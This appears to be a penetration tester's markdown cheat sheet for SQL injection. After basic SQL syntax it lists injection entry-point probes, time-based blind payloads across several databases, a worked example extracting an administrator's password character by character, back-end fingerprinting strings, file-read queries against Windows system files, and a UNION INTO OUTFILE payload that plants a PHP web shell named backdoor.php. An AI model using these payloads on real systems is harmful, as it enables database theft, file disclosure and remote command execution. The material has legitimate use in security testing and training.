## Classic queries
### SELECT statement

```sql
SELECT name, description FROM products WHERE id='A1';
```

### INSERT statement

```sql
INSERT INTO person(name,surname) VALUES ("tizio","caio")
```

### UPDATE statement

```sql
UPDATE table SET field="val1",secondval=23 WHERE cond=5
```

### DELETE statement

```sql
DELETE FROM table WHERE id=4
```

### UNION statement

```sql
SELECT name, description FROM products WHERE id='A1'
UNION
SELECT name, cognome FROM users WHERE id='E3';
```


## MySQL special functions

- [MySQL](../Services/MySQL.md)

DB username: `select user();`
Substring: `select substring('elearnsecurity',2, 1);` --> result is `l`
MySQL version: `select @@version;`
List of available tables: `select table_name from information_schema.tables`
List of available columns: `select column_name fomr information_schema.columns where table_name = 'name'`


## General Commands

### Entry point detection

```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

### Comments

```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```

### Timing

```sql
# MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

# PostgreSQL (only support string concat)
1' || pg_sleep(10)
select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+
## Example
TrackingId=a' || (SELECT CASE WHEN ((SELECT SUBSTRING(password,20,1) from users WHERE username='administrator')='§a§') THEN pg_sleep(10) ELSE NULL END)-- -

# MSQL
1' WAITFOR DELAY '0:0:10'

# Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

# SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

### Identify Back-End

```sql
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

### String concatenation

```sql
# Oracle
'foo'||'bar'

# MSSQL
'foo'+'bar'

# PostgreSQL
'foo'||'bar'

# MySQL
'foo' 'bar' [Note the space between the two strings]  
CONCAT('foo','bar', ...)
```

### Substring

```sql
# Oracle
SUBSTR('foobar', 4, 2)

# MSSQL
SUBSTRING('foobar', 4, 2)

# PostgreSQL
SUBSTRING('foobar', 4, 2)

# MySQL
SUBSTRING('foobar', 4, 2)
```

### Extract multiple rows on one column

```sql
UNION select 1, extractvalue(0x0a,concat(0x0a,(SELECT group_concat(table_name) FROM information_schema.tables)))-- -#
```

### Database version

```sql
# Oracle
SELECT banner FROM v$version  
SELECT version FROM v$instance  

# MSSQL
SELECT @@version

# PostgreSQL
SELECT version()

# MySQL
SELECT @@version

# SQLite
select sqlite_version();
```

### Database contents

```sql
# Oracle
SELECT * FROM all_tables  
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
SELECT 'test',1,null FROM dual

# MSSQL
SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
select null,concat_ws(0x3a,table_schema,table_name,column_name),null from information_schema.columns for json auto--
and 1=(select concat_ws(0x3a,table_schema,table_name,column_name)a from information_schema.columns for json auto)-- 

# PostgreSQL
SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

# MySQL
SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

#SQLite
SELECT sql FROM sqlite_schema
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' # Use limit X+1 offset X, to extract all tables.
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
```

### Reading & Writing files

```sql
# MSSQL
## Permissions: The BULK option requires the ADMINISTER BULK OPERATIONS or the ADMINISTER DATABASE BULK OPERATIONS permission.
... union select null,(select x from OpenRowset(BULK ’C:\Windows\win.ini’,SINGLE_CLOB) R(x)),null,null
... and 1=(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x))-- 

# MySQL
UNION all select 1, 2, load_file(C:/Windows/System32/drivers/etc/hosts)
UNION all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'

# PostgreSQL (traditional file)
COPY <table_name> from <file_name>
COPY <table_name> to <file_name>

CREATE temp table awae (content text);
COPY awae from $$c:\awae.txt$$;
SELECT content from awae;
DROP table awae;
```

**PostgreSQL** **[Large Objects](https://www.postgresql.org/docs/9.2/largeobjects.html)** (update huge files on the file system)

```sql
amdb=# select lo_import('C:\\Windows\\win.ini', 1337);
lo_import
-----------
194206
(1 row)
amdb=# \lo_list
Large objects
ID | Owner | Description
--------+----------+-------------
1337 | postgres |
(1 row)

# The amount of data per page is defined to be LOBLKSIZE (which is currently BLCKSZ/4, or typically 2 kB).

## Read
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
loid | pageno | encode
------+--------+----------------------------
1337 | 0 | ; for 16-bit app support\r+
| | [fonts]\r +
| | [extensions]\r +
| | [mci extensions]\r +
| | [files]\r +
| | [Mail]\r +
| | MAPI=1\r +
| |
(1 row)

## Update
amdb=# update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and
pageno=0;
UPDATE 1
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
loid | pageno | encode
------+--------+--------
1337 | 0 | w00t
(1 row)

amdb=# select lo_export(1337, 'C:\\new_win.ini');
lo_export
-----------
1
(1 row) 

## Delete large objects
amdb=# \lo_unlink 1337
lo_unlink 1337
amdb=# \lo_list
Large objects
ID | Owner | Description
----+-------+-------------
(0 rows)
```

## More advanced command and features

- [SQL Injection](../Web%20&%20Network%20Hacking/SQL%20Injection.md)